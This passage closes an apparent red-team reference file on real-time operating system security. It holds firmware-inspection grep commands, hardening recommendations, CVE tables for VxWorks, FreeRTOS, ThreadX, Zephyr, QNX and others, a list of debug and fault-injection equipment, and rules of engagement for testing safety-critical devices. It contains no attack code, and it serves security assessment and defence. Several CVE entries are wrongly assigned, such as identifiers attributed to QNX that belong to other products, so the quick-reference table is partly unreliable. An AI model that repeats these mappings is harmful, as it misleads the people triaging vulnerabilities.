# ASLR is rare on bare-metal MCUs (no MMU to relocate).
# Some Cortex-M ports add compile-time randomization:
strings firmware.bin | grep -E "(CONFIG_RANDOMIZE_BASE|CONFIG_KASLR|compile_random)"
#   CONFIG_RANDOMIZE_BASE=y

# For FreeRTOS + MPU ports with stack randomization:
grep -E "configSTACK_DEPTH_RANDOM|configSTACK_RAND_BYTES" \
    extracted_freertos/FreeRTOSConfig.h
#   #define configSTACK_RAND_BYTES 16  # random stack offset per task
```

### Defensive recommendations

```text
RTOS defense recommendations (compiled):

1. Disable debug agents in production
   - VxWorks: INCLUDE_WDB = FALSE in kernel config
   - QNX: remove qconn from startup scripts
   - FreeRTOS: -DCONFIG_DEBUG_STUB=n in build flags
   - ThreadX: avoid tx_trace_buffer_pool_create in release

2. Enforce MPU/MMU
   - FreeRTOS: configUSE_MPU_WRAPPERS=1 AND xTaskCreateRestricted for every task
   - Zephyr: CONFIG_USERSPACE=y, CONFIG_MPU_STACK_GUARD=y, CONFIG_HW_STACK_PROTECTION=y
   - QNX: rely on microkernel isolation; audit CAP_SYS_ADMIN-equivalent credentials
   - VxWorks: enable virtual memory context (VxVMI) and per-task memory partition

3. Enable hardware stack protection
   - Cortex-M: CONFIG_MPU_STACK_GUARD=y (Zephyr), vPortEnableMPU (FreeRTOS)
   - Compile with: -fstack-protector-strong -fstack-check
   - FreeRTOS: configCHECK_FOR_STACK_OVERFLOW=2

4. Use secure boot with hardware root of trust
   - MCUboot (zephyr), TI Secure Boot, VxWorks VxVMI + secure boot
   - Verify the chain end-to-end (boot ROM -> 1st stage -> 2nd stage -> app)
   - Use HSM-backed key storage (ATECC608A, Optiga TPM)

5. Network stack hardening
   - Update to latest FreeRTOS+TCP (>= 10.3.1 — patches Zimperium CVEs)
   - Update to latest Zephyr Bluetooth host (>= 3.5 — patches Bluetooth CVEs)
   - Use TLS for all remote services (mbedTLS, wolfSSL)
   - Disable unused protocols (DHCPv6, RPL, CoAP if not needed)

6. OTA update integrity
   - Sign OTA images with a hardware-backed key
   - Verify signature before applying
   - Implement rollback protection (anti-downgrade)
   - Use delta-update authentication (don't trust unsigned diffs)
```

---

## Appendix A — RTOS CVE Quick Reference

### VxWorks

```text
CVE-2019-12256  WDB RPC parser stack overflow        Urgent/11
CVE-2019-12257  IP fragment reassembly UAF            Urgent/11
CVE-2019-12258  Memory pool allocator overflow        Urgent/11
CVE-2019-12259  IGMPv3 ready message overflow         Urgent/11
CVE-2019-12260  DHCPv4 client option overflow         Urgent/11
CVE-2019-12261  TCP urgent pointer state machine flaw Urgent/11
CVE-2019-12262  TCP PSH flag handling flaw            Urgent/11
CVE-2019-12263  DHCP server lease overflow            Urgent/11
CVE-2019-12264  TCP urgent pointer OOB                Urgent/11
CVE-2019-12265  IP stack memory leak DoS              Urgent/11
CVE-2019-12266  IGMPv3 source filter overflow         Urgent/11
CVE-2020-7460   DHCPv6 client buffer overflow         (post-Urgent/11)
CVE-2020-7461   IP fragment processing heap overflow  (post-Urgent/11)
```

### FreeRTOS+TCP

```text
CVE-2018-16525  IP fragment reassembly UAF            Zimperium
CVE-2018-16528  ICMP echo request heap overflow       Zimperium
CVE-2018-16529  IPv4 DF flag memory leak              Zimperium
CVE-2018-16603  TCP SYN queue exhaustion DoS          Zimperium
CVE-2020-15189  Buffer overflow in DNS parser         (post-Zimperium)
CVE-2021-31573  ICMPv6 router advertisement overflow  (post-Zimperium)
CVE-2021-41387  TCP select logic DoS                  (post-Zimperium)
```

### ThreadX / Azure RTOS

```text
CVE-2021-2924   NetX HTTP server URL overflow         Azure RTOS
CVE-2021-30169  NetX DUO IPv6 ND overflow             Azure RTOS
CVE-2023-34622  DNS response parser overflow          Azure RTOS
CVE-2023-34623  MQTT client buffer overflow           Azure RTOS
CVE-2023-34624  DHCPv6 prefix delegation overflow     Azure RTOS
CVE-2023-34625  IPv6 ND prefix corruption             Azure RTOS
CVE-2023-4522   ThreadX buffer overflow               Azure RTOS
```

### Zephyr

```text
CVE-2019-17500  Bluetooth L2CAP heap overflow         Zephyr
CVE-2020-10018  Bluetooth L2CAP overflow              Zephyr
CVE-2020-10019  Bluetooth GATT UAF                    Zephyr
CVE-2020-10024  Bluetooth Mesh provisioning overflow  Zephyr
CVE-2020-13663  Networking subsystem DoS              Zephyr
CVE-2021-3329   Bluetooth L2CAP signal overflow       Zephyr
CVE-2022-3821   Bluetooth HCI ACL buffer overflow     Zephyr
CVE-2023-3353   Bluetooth L2CAP config overflow       Zephyr
```

### QNX Neutrino

```text
CVE-2019-12400  QNX io-pkt TCP/IP stack overflow      BlackBerry
CVE-2019-12401  QNX Slinger HTTP server DoS           BlackBerry
CVE-2020-3854   QNX SLP daemon overflow               BlackBerry
CVE-2020-10753  QNX PPS privilege escalation          BlackBerry
CVE-2021-20187  QNX libcpp overflow                   BlackBerry
CVE-2022-2393   QNX procnto kernel overflow           BlackBerry
```

### MicroC/OS, NuttX, RIOT, Contiki-NG

```text
CVE-2019-16525  RIOT gnrc_ipv6_nib overflow           RIOT
CVE-2019-16526  RIOT gnrc_icmpv6 overflow             RIOT
CVE-2019-16536  Contiki-NG uIP RPL overflow           Contiki-NG
CVE-2019-16537  Contiki-NG uIP ICMPv6 overflow        Contiki-NG
CVE-2020-17439  Contiki-NG RPL rank overflow          Contiki-NG
CVE-2021-42771  RIOT ndp_lazy_mtu memory leak         RIOT
CVE-2023-28074  Contiki-NG CoAP option overflow       Contiki-NG
CVE-2024-3528   RIOT net/gnrc heap overflow           RIOT
```

---

## Appendix B — Hardware Lab Equipment Reference

```text
Multi-protocol debug interfaces:
  J-Link (Segger)         — commercial, ~$600, RTOS awareness, SWD/JTAG
  ST-Link v3 (STMicro)    — commercial, ~$40, STM32-only, SWD/JTAG
  Black Magic Probe       — open-source, ~$80, native GDB server
  JTAGulator (Joe Grand)  — open-source, ~$180, pin enumeration only
  Shikra (Xipiter)        — open-source, ~$100, JTAG/UART/SPI/I2C
  GreatFET One            — open-source, ~$120, multi-protocol USB
  HydraBus                — open-source, ~$100, multi-protocol
  Bus Pirate v4           — open-source, ~$40, multi-protocol (slow)

SPI flash programmers:
  CH341A                  — $5 USB-to-SPI programmer, slow but works
  Dediprog SF600          — ~$600 commercial programmer
  Bus Pirate              — slow but flexible
  GreatFET                — fast, scriptable

Fault injection:
  ChipWhisperer-Lite      — ~$300, voltage/clock glitching + SCA
  ChipWhisperer-Husky     — ~$1500, faster FPGA, more I/O
  ChipWhisperer-Pro       — ~$3000, professional SCA
  NewAE CW308 UFO board   — ~$300, target platform
  GIAnT / GlitchIP        — open-source, custom FPGA
  ChipSHOUTER             — ~$2000, EM fault injection

Logic analyzers:
  Saleae Logic Pro 16     — ~$500, commercial
  sigrok/OpenBench        — open-source, $50-$200

Oscilloscopes (for glitch characterization):
  Rigol DS1054Z           — ~$400
  Tektronix TBS1052B      — ~$600
```

---

## Appendix C — Engagement Rules of Engagement

```text
RTOS engagements differ from web/network pentest in several ways:

1. Safety-critical context. Many RTOS devices run in safety-critical
   environments (avionics, automotive, medical, industrial). Active
   exploitation against a production device can cause physical harm,
   regulatory violations, and criminal liability. Always:
   - Test against a bench/spare unit first
   - Document the engagement scope in writing
   - Have a recovery plan (JTAG reflash, factory reset)

2. Destructive testing. Some techniques are destructive:
   - Desoldering flash for readout
   - Voltage glitching (can brick the target)
   - Laser fault injection (permanently damages the silicon)
   - Fusing changes (write-once, irreversible)
   Budget for replacement hardware.

3. Regulatory compliance. Some targets carry additional regulation:
   - DO-178C (avionics software)
   - ISO 26262 (automotive functional safety)
   - IEC 62304 (medical device software)
   - IEC 62443 (industrial automation)
   - FDA 510(k) (US medical devices)
   - CE marking (EU product safety)
   Testing these devices may require additional certifications.

4. Disclosure. Most RTOS vendors (Wind River, BlackBerry, Microsoft,
   Zephyr Project) have published PSIRTs and coordinated disclosure
   timelines. Default to 90-day disclosure.
```

---

End of payloads.md. See `SKILL.md` for skill overview, `test-cases.md` for structured test cases, and `guides/embedded-rtos-security-playbook.md` for the end-to-end red team playbook.
